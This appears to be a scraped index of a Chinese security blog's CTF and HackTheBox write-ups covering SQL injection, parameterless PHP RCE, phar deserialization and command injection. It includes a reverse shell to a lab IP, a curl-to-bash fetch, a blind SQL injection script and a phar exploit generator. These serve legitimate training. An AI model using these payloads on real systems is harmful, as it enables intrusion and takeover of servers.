Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook............. 有点摸不着头脑，于是谷歌一下，发现这是属于brainfuck编码中的一种，不禁让我联想到了原来伤眼睛的jsfuck编码……那么在线解码一下（找个好点的网站，开始我找的网站只解了一部分），得到base32编码。再base32解码，发现得到的结果可以进行base64解码，且结果开头有图片的文件头。那么可以确认是图片文件内容进行了base64编码。那直接解出文件就好了（可以用python，也可以在线）。得到二维码，直接扫码得flag。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"hackthebox-AI——有趣的sql+JDWPgetshell","slug":"hackthebox-AI——有趣的sql-JDWPgetshell","date":"2020-01-29T05:37:43.000Z","updated":"2021-02-18T05:09:10.736Z","comments":true,"path":"2020/01/29/hackthebox-AI——有趣的sql-JDWPgetshell/","link":"","permalink":"https://www.bycsec.top/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/","excerpt":"终于又等到hackthebox更新退役靶机了，这次的靶机是AI。因为比较有意思所以来记录下。不过过程并非一帆风顺。其中还遇到靶机磁盘写满导致无法写入文件的事。删了半天才想起来要重设靶机…… 跟上次一样参考了下大神的视频https://www.youtube.com/watch?v=7n7YRntu3bc&amp;t=1391s视频真的非常良心。","text":"终于又等到hackthebox更新退役靶机了，这次的靶机是AI。因为比较有意思所以来记录下。不过过程并非一帆风顺。其中还遇到靶机磁盘写满导致无法写入文件的事。删了半天才想起来要重设靶机…… 跟上次一样参考了下大神的视频https://www.youtube.com/watch?v=7n7YRntu3bc&amp;t=1391s视频真的非常良心。 (这次做之前更新kali虚拟机,又把自己的虚拟机弄死机了……好在现在不那么容易整体炸掉，倒是kali的界面越更新越舒适，挺不错的) 本机ip:10.10.15.60 靶机ip:10.10.10.163 首先第一步当然是探测端口了 1namp -sC -sV -oA ai 10.10.10.163 发现有22与80端口开放。既然有http服务，那就尝试直接访问吧。有一个主页面。同时也发现了其他php文件，唯一比较有意思的就是下面这个ai.php页面，有一个文件上传点。 但是很奇怪。居然是.wavfile。通常我所知道的文件上传点也就图片马或者phar反序列化或者其他类型的getshell。而它提示的drop your query using wav file.似乎是在说明我们可以进行查询操作。 那么首先随便传一个test.php上去。内容随意。发现没有回显。 看来是要wav的音频文件了。使用音频文件执行查询，这点真的难以弄懂。那么在尝试弄清漏洞类型之前先来目录爆破一下，看有没有什么别的信息： 1gobuster dir -u http:&#x2F;&#x2F;10.10.10.163 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x php 基于这里都是php，我们在gobuster后着重加上-x php进行筛选。解果大致如下： 12345678&#x2F;index.php (Status: 200)&#x2F;contact.php (Status: 200)&#x2F;about.php (Status: 200)&#x2F;images (Status: 301)&#x2F;uploads (Status: 301)&#x2F;db.php (Status:301)&#x2F;intelligence.php(Status: 200)&#x2F;ai.php(Status: 200) 其中ai.php等等都是主页面就提供了的。新发现的页面包括intelligence.php跟db.php。上传跟图片界面我们都没有权限进去。那么访问下唯一可以访问的intelligence.php 发现了这个页面。似乎存在着词语的替换关系。从表的右列中我们不难找到一些熟悉的符号–union,#,---,Schema等等。这些都是常常出现在sql注入中的符号。结合我们还爆破出了db.php，可以猜想是否有sql注入的漏洞呢？ 答案是正确的。而且脑洞大开的是：我们要用语言转成音频文件上传来进行注入。这也许就是这个AI靶机的名字所在吧。 首先google linux say command， 发现有这样的一个软件。叫做festival。 1apt-get install festival 使用它其中一个叫text2wave的就能将语句转成语音文件。比如用下管道符，生成一个test.wav，内容为hello。 1echo &quot;Hello&quot;| text2wave -o test.wav 尝试听下这个音频，发现是个男低音（也许是机器合成音?）然后再次尝试上传发现input有结果，那么就尝试下翻译成英文来sql注入吧。(这点对非英语母语的国家的人应该非常不友好……毕竟有些偏门的括号之类的英文我也不太熟） 123( openparenthesis 左括号) closeparenthesis 右括号- hyphen 连字符 基于一开始还探测到的intelligence.php中有些字符对应关系，不难想到我们需要使用那张表来绕过注入比如我的尝试payload 1&#39; union select database()--- 需要换作 1open single quote, join select , database open parenthesis close parenthesis comment database 再重复上面生成test.wav的操作，就可以上传注入。 基于hackthebox易得user的尿性，可以猜出一张users表然后爆出username跟password 123&#39;union select username from user---open single quote, join , select , username from users comment databaseopen single quote, join , select , password from users comment database 显然，我们的http页面并没有什么让我们登录进去的方法或页面。基于之前的端口探测发现有ssh开放，不妨尝试ssh登录成功登陆。并且user.txt就在当前目录下。 之后就是常规提权的过程了。 这里开始可能会想到之前没成功访问的db.php，在/var/www/html中爆出内容可知username为dbuser,password为toor进入mysql可用的就多了。（然而我进去的时候库被别人删了……）实际上可以爆出之前alexa所在user表的内容中 12username:rootpassword:H,Sq9t6&#125;a&lt;)?q931 但是ssh登录并不成功。mysql这条路走不通。 众所周知，发现提权的漏洞点并不是一件容易的事，尤其是对我这样的小白而言。所以，我从dalao视频那发现了一个很厉害的脚本可以解决我自己的漏洞认知问题。https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite在靶机上使用其中的linpeas.sh，脚本就会自动分析可能提权的漏洞点。着实解决不少问题。不过通常结果又臭又长，可能需要耐心找一找。具体方法也很简单，本机git clone好后，起一个python监听（默认8000端口） 1python -m SimpleHTTPServer 在靶机上直接curl后执行就好了 1curl 10.10.15.60:8000&#x2F;linpeas.sh | bash 这里从linpeas.sh的结果中可以发现一个JDWP的点被标红了。那么jdwp是什么呢？我们搜索一下 JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。说白了就是JVM或者类JVM的虚拟机都支持一种协议，通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息 而这是有漏洞利用的。比如知道创宇上的https://www.seebug.org/vuldb/ssvid-89216 等等，都是jdwp的代码执行漏洞。那么我们接下来就用这个漏洞，尝试拿到root权限。首先确定使用的工具https://github.com/IOActive/jdwp-shellifier shell比较好。所以先在alexa的靶机的tmp目录下放一个反弹shell的脚本test.sh内容如下：123&#96;&#96;&#96;#!&#x2F;bin&#x2F;bashbash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.15.60&#x2F;9002 0&gt;&amp;1&#39; 然后给其执行的权限 1chmod +x test.sh 调用时只需： 1.&#x2F;test.sh 先本机监听下，没有问题，可以弹到alexa的shell。 接下来用到一个新学到的大招：端口转发。我们都知道，每次ssh登录这一靶机都要用户密码，十分麻烦。而且将要利用的jdwp是java的debug功能，据说操作时十分容易断开。那有没有什么方法可以本机处理这个jdwp呢？答案就是端口转发。原本自己以为十分复杂，但实际上并非如此。 首先在靶机上确认jdwp是运行在8000端口的。那么我先进入tomcat的目录，按下~C将直接进入ssh，然后将其转到localhost来研究 1-L 8000:localhost:8000 这时我们在本机上使用 1ss -lntp 查看主机监听的端口。就会发现8000端口处于监听状态了，user是ssh。我们也可以用同样的方法转发tomcat的8009和8080端口到本地，这样我们就能直接浏览器访问localhost:8080来分析tomcat（当然这里没有什么帮助） 当然，这里转发到本地本来只是方便调试，因为可以直接在本地手动利用jdwp的漏洞，找到一个breakpoint用debug功能来执行命令。但是这方面实在不熟（java白学了），所以还是直接利用上面的脚本舒服啊。shellifier用法 1python jdwp-shellifier.py -t 目标主机ip -p jdwp运行端口 --cmd &quot;Your Command&quot; 这里我们直接 1python jdwp-shellifier.py -t 127.0.0.1 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;&#x2F;tmp&#x2F;test.sh&quot; 因为转发了ip，端口所以使用的ip是本地。而break-on这点方便找出可以利用的断点。最后的cmd执行我们的反弹shell。本机再度监听后执行这个脚本成功反弹shell到本机。即可拿到root.txt 感觉提权这方面自己还是不太熟悉，可能因为大部分ctf比赛注重的也只是getshell层面上的吧，之后的操作还要多加了解知识学习啊。","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"}]},{"title":"从SWPU2019-WEB1&WEB4学sql注入","slug":"从SWPU2019-WEB1-WEB4学sql注入","date":"2020-01-19T13:48:33.000Z","updated":"2021-02-18T05:08:28.128Z","comments":true,"path":"2020/01/19/从SWPU2019-WEB1-WEB4学sql注入/","link":"","permalink":"https://www.bycsec.top/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/","excerpt":"本来打算这几天重新从头开始学下sql注入的，毕竟hgameweek1的wp都已经写好了，题能做的都做了。但是猛然想起今年在混了下GXYCTF前还实打实的打了GWCTF跟SWPUCTF。当时GW的题做了两道web，一道php随机数漏洞一道phpmyadmin getshell，没什么含金量就没写。而且事后看其他选手就只有一个人web做了三道，其余基本都是1,2道就觉得没什么复现其他题的必要；swpu就完全相反了，web题难度对我而言有些高了，而且还有坑在里面。当时就做了三道隐写题（记得每道隐写都是zip型题目），之后没条件后也没时间复现。所以在此再次感谢buuoj给了我复现题目的机会……","text":"本来打算这几天重新从头开始学下sql注入的，毕竟hgameweek1的wp都已经写好了，题能做的都做了。但是猛然想起今年在混了下GXYCTF前还实打实的打了GWCTF跟SWPUCTF。当时GW的题做了两道web，一道php随机数漏洞一道phpmyadmin getshell，没什么含金量就没写。而且事后看其他选手就只有一个人web做了三道，其余基本都是1,2道就觉得没什么复现其他题的必要；swpu就完全相反了，web题难度对我而言有些高了，而且还有坑在里面。当时就做了三道隐写题（记得每道隐写都是zip型题目），之后没条件后也没时间复现。所以在此再次感谢buuoj给了我复现题目的机会…… 有一说一，swpu题目难归难，官方wp还是很详细的。 web1(sql注入（union or 二次注入 ）) 这道题目的点在于sql注入。开始的登陆框知识幌子，注册账号登陆进去后就会发现有一个广告申请的这一操作。通常看到这种形式，基本确定是sql注入或者是xss。FUZZ一下后，可以确认是sql。尝试简单的注入语句，发现空格被过滤了，用/**/绕过成功。当时还FUZZ出来了报错注入的关键函数，以及常见的注释符号，关键字or也被过滤了。因此，按照自己的第一想法，可以尝试使用最普遍的union联合查询，只是这样会面临几个问题： 1.注释被过滤带来的闭合问题2.面对强过滤的or,后面进行注入爆出表名及列名的常规语句：union select group_concat(table_name) from information_schema.tables where table_schema=database()将存在information中的or被过滤的境地 事实上，对于第一点的闭合问题，自己在网上找到了相关bypass技巧。确切说不算技巧，应该是在sql注入中对应当先做的第一步‘复原sql查询语句’后所进行的常规判断。由于FUZZ，时，我们在输入-1&#39;时得到报错结果，那复原出来的语句应该是： 1select * from ads where title &#x3D; &#39;$title&#39; limit 0,1; 因此面对第一个问题，不使用过滤号，使用&#39;（单引号）闭合单引号是水到渠成的。那么现在就要开始fuzz字段数了……首先，发现order by的or也被过滤了,转而使用group by。好的，这道题当时最为人诟病的地方来了，那就是它居然有22个字段数！我想人手工使用语句fuzz发现这么多字段数应该是早就怀疑人生了吧？当时估计很多人都倒在这题的字段数上。FUZZ字段： 1-1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;1 成功后接下来union select吧 1-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 确认了回显的是2和3对应字段。那么接下来如何解决information_schema的问题呢？这里我从官方wp中学到了bypassinformation_schema的方法参考这一篇文章https://www.anquanke.com/post/id/193512仔细想想，information_schema在注入中不可或缺的原因无非是因为它包含了所有其他数据库的信息，主要是table_schema，table_name.column_name等等。那么有没有具有类似功能的存在呢？文章中提供了一种解法:sys.schema_auto_increment_columns该视图的作用就是用来对表自增ID的监控。如果表中存在自增id,那么这个视图就会包含这一 表。所以我们的解法是 1-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_colum ns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 然后难过了，回显居然是这个表不存在？！也不知道是不是这道题在buuoj上少了啥，毕竟我用的跟官方wp是一样的……那就没办法了，只能盲猜一些常见表名，比如user，password之类的。这里就开个天眼表示是users表吧。接下来由于不知道列名，引入一个以前自己不怎么熟悉的点：无列名注入，这里看到一篇文章讲的很准确：https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/这里直接引用它的数据了：普通的sql注入 1select * from users 12345678910+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+| id | name | password | email | birthdate | added |+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+| 1 | alias | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org | 1981-05-03 | 1993-03-20 14:03:14 || 2 | accusamus | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com | 1979-10-28 | 2007-01-20 18:38:29 || 3 | dolor | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com | 2005-11-16 | 1992-02-16 04:19:05 || 4 | et | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com | 2015-07-22 | 2014-03-05 22:57:18 || 5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+5 rows in set (0.00 sec) 1select 1,2,3,4,5 ,6union select * from users 1234567891011+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+| 1 | 2 | 3 | 4 | 5 | 6 |+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+| 1 | 2 | 3 | 4 | 5 | 6 || 1 | alias | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org | 1981-05-03 | 1993-03-20 14:03:14 || 2 | accusamus | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com | 1979-10-28 | 2007-01-20 18:38:29 || 3 | dolor | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com | 2005-11-16 | 1992-02-16 04:19:05 || 4 | et | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com | 2015-07-22 | 2014-03-05 22:57:18 || 5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+6 rows in set (0.00 sec) 这时若要引用，使用反引号： 1select &#96;4&#96; from (select 1,2,3,4,5,6 union select * from users)a; 则会单独拿到第四列 1234567891011+-----------------------------+| 4 |+-----------------------------+| 4 || veronica80@example.org || sawayn.amelie@example.com || stefan41@example.com || zwalsh@example.com || pattie.medhurst@example.net |+-----------------------------+6 rows in set (0.00 sec) 如果反引号被过滤了，也有其他方法。 1select b from (select 1,2,3 as b,4,5 union select * from users)a; 1234567891011+-----------------------------+| b |+-----------------------------+| 4 || veronica80@example.org || sawayn.amelie@example.com || stefan41@example.com || zwalsh@example.com || pattie.medhurst@example.net |+-----------------------------+6 rows in set (0.00 sec) 回到题目，不难得出最终payload: 1-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1, (select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 1-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1, (select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 web4昨天晚上写了写web1,折腾的够呛。今天在复现web4时也挺难受的，所幸最后还是做出来了。题目所给def注册功能并没有开放，而登录键点了也没有反应。抓包的话会有新发现：如果只有单引号的话，会报错。但是如果输入结果除了单引号还有分号的话，返回的仍是202。这代表了什么呢？首先可以确认是注入，同时还可以大致判断是堆叠注入。关于堆叠注入我并没有什么了解。于是去搜索了下，发现这几年开始有堆叠注入的ctf题在各大赛事中出现。其特点无非是：限制了常用的select,update等等关键语句。但是却没有限制你的分号使用，也就是说，我们可以一次执行多条sql语句。而如果适当搭配，一样可以起到注入的效果。根据官方的说法，这是属于PDO场景下的sql注入，出题人给的方法就是用16进制加mysql预处理来解决。其payload大致格式如下： 1set @a&#x3D;0x&#123;0&#125;;PREPARE ctftest from @a;execute ctftest; 前面的@a即为我们所需的注入语句的16进制变量，后面PREPARE ctftest from @a;execute ctftest;两句起到了定义并执行预处理语句的作用那么盲注脚本如下： 123456789101112131415161718192021222324252627import requestsurl=\"http://094a7801-436a-4a50-9b73-ea921af6361c.node3.buuoj.cn/index.php?r=Login/Login\"flag=\"\"def str_to_hex(s): return ''.join([hex(ord(c)).replace('0x', '') for c in s])for i in range(1,40): print(i) for str1 in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.\": sql = \"select if((ascii(substr((select group_concat(flag) from flag),\"+str(i)+\",1))='\"+str(ord(str1))+\"'),sleep(6),2);\" # ctf sql_hex = str_to_hex(sql) data=&#123; \"username\":\"1\\';SET @a=0x\"+str(sql_hex)+\";PREPARE st FROM @a;EXECUTE st;\", \"password\":\"123\" &#125; try: result=requests.post(url,json=data,timeout=6) except requests.exceptions.ReadTimeout: print(flag) breakprint(flag)#glzjinwantsaliendzip#glzjinnts_a_girl_friendzip#glzjinwantsgirliendzip#glzjin_wants_a_girl_friend.zip 这里可能由于buuoj的问题吧，访问过快直接429,导致每次跑出的结果都不一样。最后汇总下才推断出来是glzjin_wants_a_girl_friend.zip。(这里直接select flag from flag了，实在不想又去爆表爆列了。。）拿到源码，审计不提了。直接说出题人思路吧：发现会读取img_file内容并以base64输出。那么只要img_file包含flag.php就好了。payload: 1?r&#x3D;User&#x2F;Index&amp;img_file&#x3D;&#x2F;..&#x2F;flag.php 即可从源码处解码拿到flag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"}]},{"title":"GXYCTF--禁止套娃&BabaySqli-v3.0","slug":"GXYCTF--禁止套娃&BabaySqli-v3.0","date":"2020-01-14T06:49:18.000Z","updated":"2021-02-18T05:09:05.110Z","comments":true,"path":"2020/01/14/GXYCTF--禁止套娃&BabaySqli-v3.0/","link":"","permalink":"https://www.bycsec.top/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/","excerpt":"今天也来接着做下GXY的几道web题 禁止套娃首先是禁止套娃这一道，题目类型为无参RCE。我也是通过这一道题才了解到无参RCE这个名词，不过后来仔细想想，原来做过的BugKu的过狗一句话也有相似之处…… 话不多说，先给出我参考的文章：","text":"今天也来接着做下GXY的几道web题 禁止套娃首先是禁止套娃这一道，题目类型为无参RCE。我也是通过这一道题才了解到无参RCE这个名词，不过后来仔细想想，原来做过的BugKu的过狗一句话也有相似之处…… 话不多说，先给出我参考的文章： https://www.gem-love.com/websecurity/530.html前面的师傅里面提到了sky师傅的博文，所以我也参考了下。 那么首先，出现无参RCE的必要条件是什么呢？大抵是如下的正则： 123if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\\W]+\\((?R)?\\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123; eval($_GET[&#39;code&#39;]);&#125; 这里?R是引用当前表达式的意思，那么配上前面的成分，我们被允许的参数值必须具有以下形式：a(b(c())a()而不是a(‘342’)之类的。 那么回到题目上来，首先网页并没有太多信息，那么我们常规几板斧拿出来：1.抓包，有没有有用的信息？2.网页源码，有没有提示？3.源码泄露，git,svn等等试一遍4.扫目录，看有没有有趣的目录可以发掘5.实在不行看看题目的名字，网页的框架，有没有提示你可能存在的漏洞 。我个人认为正常的题目这样做肯定可以继续发展下去而不至于一筹莫展。当然，此处是很常见的.git源码泄露，我们把githack拿下来的index.php看一看： 123456789101112131415161718192021222324&lt;?phpinclude \"flag.php\";echo \"flag在哪里呢？&lt;br&gt;\";if(isset($_GET['exp']))&#123; if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) &#123; if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) &#123; if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) &#123; // echo $_GET['exp']; @eval($_GET['exp']); &#125; else&#123; die(\"还差一点哦！\"); &#125; &#125; else&#123; die(\"再好好想想！\"); &#125; &#125; else&#123; die(\"还想读flag，臭弟弟！\"); &#125;&#125;// highlight_file(__FILE__);?&gt; 到这就可以确认是无参RCE了，那么现在来小结下如何应对无参RCE以及如何过这里的正则：首先明确一点，基于无参RCE的格式要求，我们可利用的有很多，其中主要包括全局变量以及返回值有特殊性的函数。甚至可以像sky那样，通过getallheaders()拿到环境变量，使自己传参的参数变为可控的，进而执行命令。那么回到题目上，现在肯定第一步是看看目录了，从sky那学到的常规手法，是getcwd()获得当前目录，scandir(getcwd())获得当前目录的文件。而如果要往上层目录看的话，就利用dirname()，使用scandir(dirname(getcwd()))。不过这里我试了下好像不太行，所以改用其他方法：我们知道，scandir()读当前目录的用法是scandir(‘.’),但这里的’.’要怎么获得呢？那就要涉及到一个高级用法 1current(localeconv()) 本地试一下结果：后者之返回一个点，是完全可以利用了。扫目录 1print_r(scandir(current(localeconv()))); 那么接下来就要读flag.php了，这里我们当然只能利用flag.php在返回的数组中的键值来操作下。如果flag.php是数组最后一个数值的话，直接end()就解决了。不过这里是倒数第二个，所以有其他方法操作：1.运气法hhh因为是靠随机数，我认为干脆叫运气使然好了。 1array_rand(array_flip(scandir(current(localeconv())))) 这里array_rand()不多说，就是随机获得数组中一个下标，而array_flip则可以交换键与值。那么返回的就变成值了。因为这里只有五个文件，我们用随机数完全不用关心其随机性。 2.使用array_reverse加上next()，把数组逆过来后，flag.php变成第二个元素，恰巧是数组名指针下一个，使用next()即可。 最后，使用readfile()或highlight_file读文件即可payload: 1exp=print_r(readfile(array_rand(array_flip(scandir(current(localeconv())))))); BabySqli v3.0phar反序列化的题目。其实从去年10月份到现在自己已经听过无数次phar反序列化的漏洞了，而且学校里师傅们也一直在整相关的pop链什么的，因此寒假一定要解决这个知识点（好像已经欠了不少知识……ssrf从去年8月到现在还没有系统的好好学过……） 这道题也算是自己的第一道phar反序列化的题目吧，整体不算难。不过比赛时的师傅们可能不这么想，因为这道题的名字容易把人引向sql注入上，但其实登录界面就是个弱口令admin password。估计坑了不少人吧。 登录进去后，看到一个文件上传(现在的文件上传题很多就是phar的知识点，比如红帽杯) 同时注意到有file参数为upload，可能是个文件包含的点。因此我们尝试一下访问，发现确实存在upload.php.同理，可以确认有flag.php。但显然被ban了。因此再回到file参数上，除了直接的文件包含，当然也可以用伪协议试试，于是成功拿到home.php源码。解码后得： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?phperror_reporting(0);class Uploader&#123; public $Filename; public $cmd; public $token; function __construct()&#123; $sandbox = getcwd().\"/uploads/\".md5($_SESSION['user']).\"/\"; $ext = \".txt\"; @mkdir($sandbox, 0777, true); if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name']))&#123; $this-&gt;Filename = $_GET['name']; &#125; else&#123; $this-&gt;Filename = $sandbox.$_SESSION['user'].$ext; &#125; $this-&gt;cmd = \"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';\"; $this-&gt;token = $_SESSION['user']; &#125; function upload($file)&#123; global $sandbox; global $ext; if(preg_match(\"[^a-z0-9]\", $this-&gt;Filename))&#123; $this-&gt;cmd = \"die('illegal filename!');\"; &#125; else&#123; if($file['size'] &gt; 1024)&#123; $this-&gt;cmd = \"die('you are too big (′▽`〃)');\"; &#125; else&#123; $this-&gt;cmd = \"move_uploaded_file('\".$file['tmp_name'].\"', '\" . $this-&gt;Filename . \"');\"; &#125; &#125; &#125; function __toString()&#123; global $sandbox; global $ext; // return $sandbox.$this-&gt;Filename.$ext; return $this-&gt;Filename; &#125; function __destruct()&#123; if($this-&gt;token != $_SESSION['user'])&#123; $this-&gt;cmd = \"die('check token falied!');\"; &#125; eval($this-&gt;cmd); &#125;&#125;if(isset($_FILES['file'])) &#123; $uploader = new Uploader(); $uploader-&gt;upload($_FILES[\"file\"]); if(@file_get_contents($uploader))&#123; echo \"下面是你上传的文件：&lt;br&gt;\".$uploader.\"&lt;br&gt;\"; echo file_get_contents($uploader); &#125;&#125;?&gt; 到这里就有点以前反序列化的意思了，而之所以题目是phar反序列化，就是因为phar的优势就在于可以在伪造文件类型的同时利用phar://来进行反序列化。那我们直接看看要如何利用：首先是找可控参数，我们找到name参数是通过get传的： 1$this-&gt;Filename = $_GET['name']; 之后在找可以执行命令的点 123456function __destruct()&#123; if($this-&gt;token != $_SESSION['user'])&#123; $this-&gt;cmd = \"die('check token falied!');\"; &#125; eval($this-&gt;cmd); &#125; 只要保证token是与user的session相同即可eval执行命令。那么同时我们实例化的对象$uploader在_toString方法中看到，返回值是filename,也是我们可控的name的值。那我们只要让最后的file_get_contents()执行时读我们可控的flag.php就好了。既然如此，先随便传一个文件确定下提示我们的文件位置，确认token,然后本地生成phar文件 1234567891011121314151617181920212223&lt;?phpclass Uploader&#123; public $Filename; public $cmd; public $token;&#125;$o=new Uploader();$o-&gt;cmd='highlight_file(\"/var/www/html/flag.php)';$o-&gt;Filename='test';$o-&gt;token='GXYbef648df4f254d89810fd44f9a2fc822';echo serialize($o);$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\");//设置stub，增加gif文件头$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件$phar-&gt;stopBuffering();?&gt; 上传phar后，name参数赋值phar://+上传phar文件的地址再随便上传文件就可以触发phar反序列化，达到命令执行。 其实因为出题人多打了一个空格，导致正则匹配没效果……直接传一句话或者直接包含flag.php后传文件都可以拿flag…… GXY的题就先告一段落吧，明天还要做做代码审计的题目，之后要把基础漏洞相关知识都了解透彻，毕竟自己底子不牢。然后把欠着的ssrf,phar等等都系统学一学应该就好了","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"GXYCTF--PingPingPing&BabySqli","slug":"GXYCTF-PingPingPing-BabySqli","date":"2020-01-13T09:31:00.000Z","updated":"2021-02-18T05:09:06.776Z","comments":true,"path":"2020/01/13/GXYCTF-PingPingPing-BabySqli/","link":"","permalink":"https://www.bycsec.top/2020/01/13/GXYCTF-PingPingPing-BabySqli/","excerpt":"说来惭愧，之前12月份初报了GWYCTF,结果到了比赛的时候又因为复习忙的焦头烂额，所以一道题目都没看。刚好因为题目难度是针对校内招新的，我就现在复现下吧：题目复现地址：https://buuoj.cn/大佬们在各种比赛群里应该已经知道了这个平台的存在了，有一说一那位师傅是真的富……还是要感谢buuoj.cn提供了一个复现这些年大赛题目的机会。","text":"说来惭愧，之前12月份初报了GWYCTF,结果到了比赛的时候又因为复习忙的焦头烂额，所以一道题目都没看。刚好因为题目难度是针对校内招新的，我就现在复现下吧：题目复现地址：https://buuoj.cn/大佬们在各种比赛群里应该已经知道了这个平台的存在了，有一说一那位师傅是真的富……还是要感谢buuoj.cn提供了一个复现这些年大赛题目的机会。 Ping Ping Ping开始进入提示传参ip,原题应该是直接给了一个输入框，输入后发现有执行ping命令的效果那么看来是命令执行的题目了，命令执行的方法大抵是加上管道符或者分号，那么试试管道符尝试读flag发现果然被ban了，那么试试index.php发现提示空格被ban了。绕过空格的方法大概有以下几种： 12345678$IFS$&#123;IFS&#125;$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行&lt; &lt;&gt; &#123;cat,flag.php&#125; &#x2F;&#x2F;用逗号实现了空格功能%20 %09 不妨就用 $IFS试试，无果，用${IFS}发现{}被ban。再试$IFS$1成功。源码如下： 123456789101112131415161718/?ip=|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match))&#123; echo preg_match(\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match); die(\"fxck your symbol!\"); &#125; else if(preg_match(\"/ /\", $ip))&#123; die(\"fxck your space!\"); &#125; else if(preg_match(\"/bash/\", $ip))&#123; die(\"fxck your bash!\"); &#125; else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip))&#123; die(\"fxck your flag!\"); &#125; $a = shell_exec(\"ping -c 4 \".$ip); echo \"\"; print_r($a);&#125;?&gt; 